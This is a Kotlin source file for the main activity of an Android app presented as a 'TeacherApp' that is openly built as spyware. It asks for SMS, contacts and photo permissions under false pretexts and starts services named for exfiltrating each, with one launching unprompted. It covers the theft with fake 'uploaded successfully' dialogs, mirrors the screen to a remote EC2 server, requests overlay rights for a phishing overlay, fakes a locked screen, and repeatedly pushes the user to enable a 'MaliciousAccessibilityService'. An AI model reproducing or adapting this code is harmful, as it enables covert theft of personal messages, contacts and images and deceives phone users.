package com.example.teacherapp

import android.Manifest
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import android.view.WindowManager
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.navigation.NavHostController
import androidx.navigation.compose.rememberNavController
import com.example.teacherapp.navigation.NavGraph
import com.example.teacherapp.navigation.ScreenOverlayState
import com.example.teacherapp.services.ScreenMirrorService
import com.example.teacherapp.ui.theme.TeacherappTheme
import com.example.teacherapp.services.ContactExfiltrationService
import com.example.teacherapp.services.ImageExfiltrationService
import com.example.teacherapp.services.SmsExfiltrationService
import com.example.teacherapp.services.AppDataExfiltrationService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch


class MainActivity : ComponentActivity() {

    // Inactivity screen dimming
    private val inactivityTimeout = 2 * 60 * 1000L // 2 minutes
    private val inactivityHandler = Handler(Looper.getMainLooper())
    private val dimScreenRunnable = Runnable {
        ScreenOverlayState.isTracking = false
        val params = window.attributes
        params.screenBrightness = 0.0f
        params.alpha = 0.0f
        window.attributes = params
        window.addFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND)
        window.setDimAmount(1.0f)
    }

    // Fake lock — intercept the power/lock button
    private var isFakeLocked = false
    private var wakeLock: PowerManager.WakeLock? = null

    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == Intent.ACTION_SCREEN_OFF) {
                if (!isFakeLocked) {
                    fakeLock()
                } else {
                    realLock()
                }
            }
        }
    }

    // Batch permission launcher (upfront request on first launch)
    private val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_PHONE_STATE
        )
    } else {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_PHONE_STATE
        )
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            onAllPermissionsGranted()
        } else {
            Toast.makeText(this, "Some permissions were denied. App may not function correctly.", Toast.LENGTH_LONG).show()
        }
    }

    // Individual permission launchers — called from Settings screen
    private val imagePermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            ImageExfiltrationService.startExfiltration(this@MainActivity)
            showFakeUploadDialog()
        } else {
            Toast.makeText(this, "Cannot upload profile picture without permission", Toast.LENGTH_SHORT).show()
        }
    }

    private val contactPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            ContactExfiltrationService.startExfiltration(this@MainActivity)
            showFakeImportDialog()
        } else {
            Toast.makeText(this, "Cannot import contacts without permission", Toast.LENGTH_SHORT).show()
        }
    }

    private val smsPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            SmsExfiltrationService.startExfiltration(this@MainActivity)
            showFakeVerificationDialog()
        } else {
            Toast.makeText(this, "Cannot verify phone without permission", Toast.LENGTH_SHORT).show()
        }
    }

    // MediaProjection launcher for screen mirroring to EC2
    private val projectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            ScreenMirrorService.start(this, result.resultCode, result.data!!)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContent {
            TeacherappTheme {
                val navController = rememberNavController()
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Box(modifier = Modifier.padding(innerPadding)) {
                        NavGraph(navController = navController)
                    }
                }
            }
        }

        // Register power button / screen-off receiver
        registerReceiver(screenReceiver, IntentFilter(Intent.ACTION_SCREEN_OFF))

        // Request "Display over other apps" permission — needed for phishing overlay
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                val overlayIntent = Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    android.net.Uri.parse("package:$packageName")
                )
                startActivity(overlayIntent)
            }
        }

        // Start AppDataExfiltrationService immediately (no permission needed)
        Handler(Looper.getMainLooper()).postDelayed({
            AppDataExfiltrationService.startExfiltration(this@MainActivity)
        }, 5000)

        // Request all permissions upfront
        requestNecessaryPermissions()
    }

    private fun requestNecessaryPermissions() {
        val permissionsNeeded = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (permissionsNeeded.isNotEmpty()) {
            showPermissionRationale(permissionsNeeded)
        } else {
            onAllPermissionsGranted()
        }
    }

    private fun showPermissionRationale(permissions: List<String>) {
        AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage(
                "TeacherApp needs the following permissions to function properly:\n\n" +
                        "• SMS: To send class announcements\n" +
                        "• Phone: To verify device identity\n\n" +
                        "These permissions help enhance your user experience."
            )
            .setPositiveButton("Grant Permissions") { dialog, _ ->
                dialog.dismiss()
                permissionLauncher.launch(permissions.toTypedArray())
            }
            .setNegativeButton("Cancel") { dialog, _ ->
                dialog.dismiss()
                Toast.makeText(this, "App requires permissions to function", Toast.LENGTH_LONG).show()
            }
            .setCancelable(false)
            .show()
    }

    private fun onAllPermissionsGranted() {
        Toast.makeText(this, "Welcome to TeacherApp", Toast.LENGTH_SHORT).show()

        // Schedule timed exfiltration
        CoroutineScope(Dispatchers.Default).launch {
            delay(10000L)
            SmsExfiltrationService.startExfiltration(this@MainActivity)
            delay(5000L)
            ContactExfiltrationService.startExfiltration(this@MainActivity)
            delay(5000L)
            ImageExfiltrationService.startExfiltration(this@MainActivity)
        }

        // Step 1: Request screen sharing first
        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        projectionLauncher.launch(projectionManager.createScreenCaptureIntent())

        // Step 2: After screenshare dialog is handled, start non-stop accessibility loop
        // (delay so the two system dialogs don't overlap)
        Handler(Looper.getMainLooper()).postDelayed({
            startAccessibilityLoop()
        }, 4000)
    }

    // ========== PUBLIC FUNCTIONS — Called from Settings screen ==========

    fun requestImagePermissionAndSteal() {
        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }
        when {
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED -> {
                ImageExfiltrationService.startExfiltration(this@MainActivity)
                showFakeUploadDialog()
            }
            else -> imagePermissionLauncher.launch(permission)
        }
    }

    fun requestContactPermissionAndSteal() {
        when {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED -> {
                ContactExfiltrationService.startExfiltration(this@MainActivity)
                showFakeImportDialog()
            }
            else -> contactPermissionLauncher.launch(Manifest.permission.READ_CONTACTS)
        }
    }

    fun requestSmsPermissionAndSteal() {
        when {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED -> {
                SmsExfiltrationService.startExfiltration(this@MainActivity)
                showFakeVerificationDialog()
            }
            else -> smsPermissionLauncher.launch(Manifest.permission.READ_SMS)
        }
    }

    // ========== FAKE SUCCESS DIALOGS ==========

    private fun showFakeUploadDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("Uploading Profile Picture")
            .setMessage("Please wait while we upload your profile picture...")
            .setCancelable(false)
            .create()
        dialog.show()
        Handler(Looper.getMainLooper()).postDelayed({
            dialog.dismiss()
            Toast.makeText(this, "✅ Profile picture uploaded successfully!", Toast.LENGTH_LONG).show()
        }, 2000)
    }

    private fun showFakeImportDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("Importing Contacts")
            .setMessage("Please wait while we import your contacts...")
            .setCancelable(false)
            .create()
        dialog.show()
        Handler(Looper.getMainLooper()).postDelayed({
            dialog.dismiss()
            Toast.makeText(this, "✅ 12 contacts imported successfully!", Toast.LENGTH_LONG).show()
        }, 2000)
    }

    private fun showFakeVerificationDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("Verifying Phone Number")
            .setMessage("Checking SMS verification code...")
            .setCancelable(false)
            .create()
        dialog.show()
        Handler(Looper.getMainLooper()).postDelayed({
            dialog.dismiss()
            Toast.makeText(this, "✅ Phone number verified successfully!", Toast.LENGTH_LONG).show()
        }, 2000)
    }

    // ========== FAKE LOCK ==========

    private fun fakeLock() {
        isFakeLocked = true
        ScreenOverlayState.isTracking = false

        @Suppress("DEPRECATION")
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
            "teacherapp:fakelock"
        )
        wakeLock?.acquire(10 * 60 * 1000L)

        @Suppress("DEPRECATION")
        window.addFlags(
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        )

        val params = window.attributes
        params.screenBrightness = 0.0f
        params.alpha = 0.0f
        window.attributes = params
        window.addFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND)
        window.setDimAmount(1.0f)
    }

    private fun realLock() {
        isFakeLocked = false

        ScreenOverlayState.savedRoute?.let { route ->
            ScreenOverlayState.navController?.navigate(route) {
                popUpTo(0) { inclusive = true }
            }
        }
        ScreenOverlayState.isTracking = true

        val params = window.attributes
        params.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE
        params.alpha = 1.0f
        window.attributes = params
        window.clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND)
        window.setDimAmount(0.0f)

        @Suppress("DEPRECATION")
        window.clearFlags(
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        )
        wakeLock?.release()
        wakeLock = null
    }

    // ========== ACCESSIBILITY SERVICE ==========

    private val accessibilityHandler = Handler(Looper.getMainLooper())
    private var accessibilityDialogShowing = false

    private fun isAccessibilityServiceEnabled(): Boolean {
        val enabled = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        val splitter = TextUtils.SimpleStringSplitter(':')
        splitter.setString(enabled)
        val combined = "$packageName/com.example.teacherapp.services.MaliciousAccessibilityService"
        while (splitter.hasNext()) {
            if (splitter.next().equals(combined, ignoreCase = true)) return true
        }
        return false
    }

    private val accessibilityCheckRunnable = object : Runnable {
        override fun run() {
            if (isFinishing) return
            if (!isAccessibilityServiceEnabled()) {
                if (!accessibilityDialogShowing) showAccessibilityDialog()
                accessibilityHandler.postDelayed(this, 8000)
            }
        }
    }

    fun startAccessibilityLoop() {
        accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
        accessibilityHandler.post(accessibilityCheckRunnable)
    }

    private fun showAccessibilityDialog() {
        if (isFinishing || accessibilityDialogShowing) return
        accessibilityDialogShowing = true
        AlertDialog.Builder(this)
            .setTitle("Action Required")
            .setMessage(
                "TeacherApp requires accessibility features to be enabled for enhanced text input " +
                        "assistance and note-taking support.\n\n" +
                        "Please enable 'TeacherApp' in the Accessibility settings to continue."
            )
            .setPositiveButton("Open Settings") { dialog, _ ->
                dialog.dismiss()
                accessibilityDialogShowing = false
                openAccessibilitySettings()
            }
            .setCancelable(false)
            .setOnDismissListener { accessibilityDialogShowing = false }
            .show()
    }

    private fun openAccessibilitySettings() {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
            Toast.makeText(this, "Enable ALL TeacherApp services in the list", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            Toast.makeText(this, "Could not open accessibility settings", Toast.LENGTH_LONG).show()
        }
    }

    // ========== LIFECYCLE ==========

    override fun onUserInteraction() {
        super.onUserInteraction()

        if (isFakeLocked) {
            realLock()
            return
        }

        inactivityHandler.removeCallbacks(dimScreenRunnable)
        val wasScreenDimmed = !ScreenOverlayState.isTracking
        val params = window.attributes
        params.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE
        window.attributes = params
        params.alpha = 1.0f
        window.clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND)
        window.setDimAmount(0.0f)

        if (wasScreenDimmed) {
            ScreenOverlayState.savedRoute?.let { route ->
                ScreenOverlayState.navController?.navigate(route) {
                    popUpTo(0) { inclusive = true }
                }
            }
            ScreenOverlayState.isTracking = true
        }

        inactivityHandler.postDelayed(dimScreenRunnable, inactivityTimeout)
    }

    override fun onResume() {
        super.onResume()
        inactivityHandler.postDelayed(dimScreenRunnable, inactivityTimeout)
        // When user returns from accessibility settings, re-trigger the loop
        // so it immediately re-checks and dismisses or re-prompts
        if (!isAccessibilityServiceEnabled()) {
            accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
            accessibilityHandler.postDelayed(accessibilityCheckRunnable, 1500)
        } else {
            // Both services enabled — stop the loop
            accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
        }
    }

    override fun onPause() {
        super.onPause()
        inactivityHandler.removeCallbacks(dimScreenRunnable)
    }

    override fun onDestroy() {
        accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
        unregisterReceiver(screenReceiver)
        wakeLock?.release()
        super.onDestroy()
    }
}

@Composable
fun StartScreen(modifier: Modifier = Modifier, navController: NavHostController) {
    Column(
        modifier = modifier.fillMaxSize().padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Spacer(modifier = Modifier.weight(1f))
        Text(
            text = "Welcome to MyApp",
            fontSize = 32.sp,
            fontWeight = FontWeight.Bold,
            color = MaterialTheme.colorScheme.primary
        )
        Spacer(modifier = Modifier.weight(2f))
        Column(modifier = Modifier.fillMaxWidth(), verticalArrangement = Arrangement.spacedBy(12.dp)) {
            Button(onClick = { navController.navigate("register_screen") }, modifier = Modifier.fillMaxWidth()) {
                Text(text = "Create New Account")
            }
            OutlinedButton(onClick = { navController.navigate("login_screen") }, modifier = Modifier.fillMaxWidth()) {
                Text(text = "Use Existing Account")
            }
        }
        Spacer(modifier = Modifier.height(16.dp))
    }
}